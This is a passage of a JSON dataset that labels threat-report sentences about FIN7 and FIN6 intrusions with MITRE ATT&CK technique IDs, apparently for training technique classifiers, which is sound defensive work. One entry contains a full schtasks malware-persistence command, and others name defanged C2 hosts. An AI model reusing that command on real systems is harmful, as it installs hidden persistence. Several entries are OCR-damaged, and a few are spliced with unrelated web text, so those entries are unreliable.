    ]
  },
  {
    "type": "text",
    "text": "This system information is also stored in this registry key: HKEY_CURRENT_USER\\System\\CurrentControlSet\\Control\\Network\\CLM",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "injects its code to that process",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "$\"  ammyy.pl- this enables the malware to run AMMYY remote desktop control software %\"  vnc.pl- this enables the malware to run a remote desktop VNC application",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "It uses social engineering to convince the recipient to enable macros through the use of the images, logo and tagline of a newly launched, legitimate VPN tool InvinciBull by cybersecurity company Finjan.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The deobfuscated JavaScript is actually a backdoor component that directly communicates to the C2 server (in this case hxxps://bing-cdn[.]com)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The document contains messages enticing the user to click on an embedded object that executes scripts",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "When clicked it launches an infection chain",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "injects a stealer DLL in memory",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "from a word document object",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "the actor primarily utilize malicious shortcut files (LNK) or visual basic scripts (VBS or VBE) to achieve code execution from within their lure",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "FIN7 appears to have pivoted from using OLE embedded LNK files to using OLE embedded CMD files. When executed, the CMD file writes JScript to \"tt.txt\"",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "#le system management",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "#le transfer",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "POS and Outlook data the$",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Downloads executable",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "injects into new process",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Deletes #le or service",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "injects directly into new process",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "sends it to the C2 server",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "processes to the C2 Returns list of running server",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Download and execute shellcode from speci#ed address",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "leveraged hidden sho%cut #les (LNK #les) to initiate the infection",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The email contains a macro-laden Word document.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The macro Vrst extracts the JScript from the caption then saves the content to debug.txt in the current user's temporary folder (%TMP%)",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "the macro creates a scheduled task",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Finally, the macro sleeps for 10 seconds then deletes the malicious scheduled task",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "retrieval of infected system information",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "listing of running processes",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "uninstalling and updating itself",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "it creates a scheduled task \"GoogleUpdateTaskMachineSystem\" for persistence using the following command pattern: schtasks /Create /f /tn \"GoogleUpdateTaskMachineSystem\" /tr \"wscript.exe //b /e:jscript C:\\Users\\[user account]\\AppData\\Local\\Temp\\{[hex]-[hex]-[hex]-[hex]-[hex]}\\debug.txt\" /sc minute /mo 5",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Return various information about the infected machine, such as computer and domain name, OS, screen size,",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Return running process list (name + id)",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Delete installation Vle and path and remove scheduled task",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Perform a \"load_exe\" request to the C&C to retrieve an EXE",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Perform a \"load_exe\" request to C&C to retrieve an EXE, save it as debug.log",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "execute the EXE via WMI",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Perform a \"load_dll\" request to the C&C to retrieve a DLL, save it as debug.backup",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Perform a \"load_cmd\" request to the C&C to retrieve a command to execute",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "create temp Vle named log_[date].cmd containing command to execute, execute the command and sleep for 55 seconds",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Send Vle output to the C&C via a POST request",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "remove the temporary command Vle",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Perform a \"load_powershell\" request to the C&C to retrieve a command to execute",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "create a temp Vle named log_[date].log containing a PowerShell command to execute, execute the command, and sleep for 55 seconds",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "executes a PowerShell command via WMI",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Perform a \"load_pass\" request to the C&C to retrieve a PowerShell command",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The Bateleur C&C protocol occurs over HTTPS and is fairly straightforward with no additional encoding or obfuscation. Bateleur uses HTTP POST requests with a URI of \"/?page=wait\" while the backdoor is waiting for instructions.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "obtained an additional shellcode payload stored in a registry key.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "The second stage shellcode launched the CARBANAK DLL (stored in a registry key), which spawned an instance of Service Host (\"svchost.exe\") and injected itself into that process",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The new \"ScRegisterTCPEndpoint\" function (shellcode) contained a reference to the path of \"\\REGISTRY\\MACHINE\\SOFTWARE\\Microso$\\ DRM\", which is a registry location where additional malicious shellcode and the CARBANAK DLL payload was stored on the system",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "The shellcode stored within the registry path \"HKLM\\SOFTWARE\\Microso$\\DRM\" used the API function \"RtlDecompressBu%er\" to decompress the payload",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "The combined script from Word textbox drops the following components: \\Users\\ [user_name]\\Intel\\58d2a83f7778d5.36783181.v bs \\Users\\ [user_name]\\Intel\\58d2a83f777942.26535794. ps1 \\Users\\ [user_name]\\Intel\\58d2a83f777908.23270411.v bs",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "the script creates a named schedule task for persistence to launch \"58d2a83f7778d5.36783181.vbs\" every 25 minutes.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "This VBScript checks if the \"58d2a83f777942.26535794.ps1\" PowerShell script is running using WMI queries and, if not, launches it.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "info: Sends victim machine information (OS, Processor, BIOS and running processes) using WMI queries",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "processList: Send list of process running",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "delete: Delete the speci\"ed \"le",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "the document creates two scheduled tasks and creates one auto-sta% registry entry pointing to the LNK \"le",
    "command": "",
    "labels": [
      "T1053.005",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "the script executed code from PowerSploit designed to resolve Windows API functions necessary for performing the injection",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "the script would allocate memory in its current process and use the System.Runtime.Interopservices.Marshal class to copy code into the newly allocated memory",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Once injected, the payload proceeded to write a binary encoded blob into the registry key HKLM\\Software\\Microsoft\\DRM",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "the POS scraping capability will attempt to inject Library/Webinar-H Platform.html) Utm_source=Giga Service Providers itself into svchost.exe, wuauclt.exe or explorer.exe (in that order) Links&Utm_conte (Https://Www.gig",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Upon successful injection, the scraper enumerates running Provider.htm Product Do (Https://Ww processes, comparing them to a list provided via a text file on (Https://Com Cloud/Gigavu disk",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Once the scraping capability has identified a process of interest, OpenStack the payload will read memory from the process and extract track (Https://Www.giga one and track two data formats",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "The text within the email simulated a legitimate businessrelated message in order to lead the recipient employee to open the attachment and unwittingly activate the malware that would infect the computer.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Once infected, the compromised victim computer connected to one of FIN7's command and control servers located throughout the world",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Through a specially designed control panel, FIN7 could download a wide array of additional malware to the victim computer,",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "FIN7 then used its unauthorized access to the victim's computer system to locate and extract various information and property of value, such as financial information and caches of customer payment card data",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "possesses a tracking pixel that allows the actor to verify whether or not the target is opening attachments, and if so can provide initial visibility into the system of the target",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "The second document the attacker sends is usually the one with the actual payload. This document has either a VBA macro or an embedded OLE which persuades the target to run these in order to drop the first stage loaders",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "To establish persistence, the group then injects a scheduled task to reestablish the C2 connection to Cobalt Strike which historically is run twice a day",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "From there the adversary loads process injection tools or memory scrapers (commonly mimikatz) and pivots using tools like powersploit, RDP services, and PowerAdmin Exec.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1021.001",
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "exploits the INCLUDEPICTURE feature of Microsoft Word",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "to get context information about the victim's computer, and the availability and version number of Microsoft Word.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "In various cases, the associated macro also scheduled tasks to make GRIFFON persistent.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "This module mainly relies on WMI and Windows objects to deliver results",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "more than 20 artifacts are retrieved from the system by this implant during the reconnaissance stage,",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "from the date and time of operating system installation and membership in a Windows domain",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "a list of and the resolutions of the workstation's monitors",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "contains a Meterpreter downloader widely known as \"Tinymet\". This downloader, seen in past FIN7 campaigns, downloads a one-byte XOR-encrypted (eg. with the key equal to 0x50 or 0x51) piece of meterpreter shellcode to execute",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "If the victim appears valuable to the attackers, a GRIFFON implant installer is pushed to the victim's workstation",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "This module stores another instance of the GRIFFON implant inside the registry to achieve persistence",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "AveMaria is a classic infostealer bot that collects all possible credentials",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "the group still deploys lightweight JavaScript backdoor with communication over HTTPS mimicking Content Delivery Network (CDN) domains",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The FIN7 Microsoft document loaders do not rely on any exploits but simply require a social engineering trick (https://www.sentinelone.com/blog/phishing-revealingvulnerable-targets/) to \"Enable Content\" to activate macros.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "operating system, screen resolution",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "retrieves a process list.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "This command downloads an executable from the C2 and directly runs it in memory.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "This movement enabled FIN6 to then inject LockerGoga and Ryuk ransomware",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The command downloaded a Cobalt Strike payload",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "use of a Windows Service created by Metasploit",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "that was used to communicate with a C2 server for dropping additional payloads into compromised systems.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "pushing attack scripts down to compromised computers",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The emails are often industryspecific and crafted to entice a victim to open the message and execute the attached document",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Once they are deleted by the attackers' code, there is nothing left to be forensically recovered.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "The campaigns maintain persistence on machines by creating two daily scheduled task entries",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Once a user has double-clicked the embedded image, the form executes a VB setup script",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The script writes files to the path %appdata%\\Roaming\\Microsoft\\Templates\\, then creates two task entries",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The SQLRat script is designed to make a direct SQL connection to a Microsoft database controlled by the attackers",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The script retrieves an item from the bindata table and writes the file to disk",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "BOOSTWRITE – an in-memory-only dropper",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The malware loads into the same process as the Command Center process by abusing the DLL load order of the legitimate Aloha utility",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The payloads are expected to be PE32.DLLs which, if the tests pass, are loaded into memory without touching the \"lesystem",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "RDFSNIFFER is a module loaded by BOOSTWRITE which allows an a!acker to monitor and tamper with legitimate connections made via NCR Corporation's 'Aloha Command Center Client' (RDFClient)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "RDFSNIFFER loads into the same process as the legitimate RDFClient by abusing the utility's DLL load order, launching each time the 'Aloha Command Center Client' is executed on an impacted system",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "When the RDFSNIFFER module is loaded by BOOSTWRITE it hooks several Win32 API functions intended to enable it to tamper with NCR Aloha Command Center Client sessions or hijack elements of its user-inte%ace",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "This module also contains a backdoor component that enables it to inject commands into an active RDFClient session",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "This backdoor allows an a!acker to upload, download, execute and/or delete arbitrary \"les",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The Word document executes a fileless attack that uses DNS queries to deliver the next shellcode stage (Meterpreter)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "the first stage JavaScript creates a scheduled task that executes the second stage code within a minute",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "an additional scheduled task \"AdobeFlashSync\" is created for persistency",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Afterwards, it deletes its own JavaScript code traces",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "The latter PowerShell injects a shellcode into its own process using well-known CreateThread and VirtualAlloc techniques",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "malware known asMore_Eggs (aka Terra Loader)",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "FIN6 uses legitimate publicly available tools to map the internal network and conduct reconnaissance",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Microsoft's built-in SQL querying tool",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "ProcDump (a Microsoft SysInternals command-line utility used to perform analysis of running processes).",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "FIN6 relies on credentials stolen from various systems (e.g. usernames and password hashes) for lateral movement",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The malware checks network connectivity by sending an HTTP HEAD (GET in some new versions) request to the following legitimate URL: •hxxp://www[.]w3[.]org/1999/XSL/Format",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "the use of Windows Management Instrumentation (WMI) to automate the remote execution of PowerShell scripts",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "downloaded a ZIP file containing a malicious Windows Script File (WSF) that initiated the infection routine of the More_eggs backdoor",
    "command": "",
    "labels": [
      "T1059.003",
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "the ZIP file and WSF files were deleted upon a successful malware infection",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "established a reverse shell connection to the attacker's command-and-control (C&C) infrastructure",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "download and execution of files and scripts and running commands using cmd.exe",
    "command": "",
    "labels": [
      "T1059.003",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "the More_eggs backdoor later downloaded additional files, including a signed binary shellcode loader and a signed Dynamic Link Library (DLL)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "to create a reverse shell and connect to a remote host",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "they employed WMI and PowerShell techniques to perform network reconnaissance and move laterally within the environment",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Meterpreter is a payload component in the Metasploit Framework that uses in-memory DLL injection",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "second stage Meterpreter DLL into memory, allowing the attacker to spawn a Meterpreter session via a handler and initiate the loading of extensions, such as Mimikatz",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "the attacker leveraged in-memory attacks by injecting malicious code, in this case Mimikatz, into legitimate system processes",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "that !rst load a small downloader and then a Cobalt beacon.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The injected object will create a new script element to load another remote script stored on Google Storage.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The landing page initiates a download of a Microsoft Word Wle (Figure 4) with malicious macros",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "If the recipient enables macros, the \"More_eggs\" payload will be downloaded and executed.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "its ability to download additional payloads, More_eggs has extensive capabilities to proWle the infected machine",
    "command": "",
    "labels": [
      "T1005",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "initializing PowerShell/WMI stages that downloaded and reflectively loaded Cobalt-Strike beacon with PowerShell extension directly into the memory",
    "command": "",
    "labels": [
      "T1047",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "some of them are executed through WMI",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "that is either remotely injected into the existing 32 bit or into a newly created 32 bit PowerShell process (if the current PowerShell is 64bit)",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The injected shellcode is a regular Metasploit downloader shellcode",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "downloads the next stage shellcode directly into memory from the C2",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "shellcode backdoor beacon with PowerShell and Mimikatz functionality",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "install \"WindowsHelpAssistant\" task in the task scheduler",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "uses rundll32.exe with System privileges to execute and export function \"workerInstance\"",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "similar command execution as part of the HKLM Run key",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "These emails originated from a compromised or spoofed account",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "launched an IcedID payload, which was ultimately used to execute an instance of BEACON",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "An actor logged into an internet-facing system via RDP",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The account used to grant initial access was a generic suppo$ account",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "An actor logged into a Citrix web po$al account with a weak password.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The use of legitimate credentials and broad distribution of BEACON across victim environments",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "installing BEACON payloads on many servers and workstations",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Intrusion operators regularly obtained and maintained access to multiple domain and local system accounts with varying permissions that were used throughout their operations",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The actor a!empted to identify hosts running the KeePass password safe so#ware",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The responsible actor executed a large number of reconnaissance scripts via Cobalt Strike to collect network, host, %lesystem, and domain related information",
    "command": "",
    "labels": [
      "T1016",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Multiple built-in Windows commands were used to enable network, account, and host reconnaissance of the impacted environment,",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "the actors also supplied and used Advanced IP Scanner and Ad%nd to suppo$ this stage of their operations",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "FTP server",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "a reconnaissance script designed to enumerate directories across internal hosts",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "An actor employed the ad%nd tool and a batch script to collect information about their network, hosts, domain, and users.",
    "command": "",
    "labels": [
      "T1016",
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The output from this batch script (2ad%nd.bat) was saved into an archive named 'ad.7z' using an instance of the 7zip archiving utility named 7.exe.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "An actor collected directory listings from %le servers across an impacted environment",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Stolen credentials were then used to move laterally",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "across the network via RDP",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "using a local administrator account",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "a prede%ned FTP server using a hard-coded username and password",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "An actor has been observed employing a %le replication utility and copying the stolen data to a cloud %le hosting/sharing service.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "using a domain administrator account created earlier in the intru",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "FIN6 used a Metasploit PowerShell module to download and execute shellcode and to set up a local listener that would execute shellcode received over a specific port. Similarly, FIN6 used at least two downloaders called HARDTACK and SHIPBREAD (apparent variations on Metasploit payloads) to establish backdoor access to the compromised environment. Both of these tools are configured to connect to remote command and control (CnC) servers and download and execute shellcode.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "FIN6 generally used either registry run keys",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "FIN6 used additional public utilities such as Windows Credentials Editor for privilege escalation and credential harvesting",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "gaining access with valid credentials",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "gathered information on systems running SQL instances, dumping schemas for multiple databases and SQL user accounts",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Once the malware identifies track data, it copies and encodes it to a local file in a subdirectory of the c:\\windows\\ directory while attempting to conceal these files with .dll or .chm extensions.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "they then copied the stolen data to external CnC servers under their control using the FTP command line utility",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Cobalt Strike, Metasploit, and publicly available tools such as Adfind and 7-Zip to conduct internal reconnaissance, compress data, and aid their overall mission",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "in the initial phase of an intrusion using stolen credentials",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Pivoting from these initial leads, analysts identified suspicious SMB connections and Windows Registry artifacts that indicated the attacker had installed malicious Windows services to execute PowerShell commands on remote systems.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "FIN6 leveraged stolen credentials to move laterally",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "using the Windows' Remote Desktop Protocol (RDP)",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The encoded payload was a Cobalt Strike httpsstager that was injected into the PowerShell process that ran the command.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The Cobalt Strike httpsstager was configured to download a second payload from hxxps://176.126.85[.]207:443/7sJh.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "it was a shellcode payload configured to download a third payload from hxxps://176.126.85[.]207/ca",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "FIN6 also leveraged the creation of Windows services (named with a random 16- character string such as IXiCDtPbtGWnrAGQ) to execute encoded PowerShell commands",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
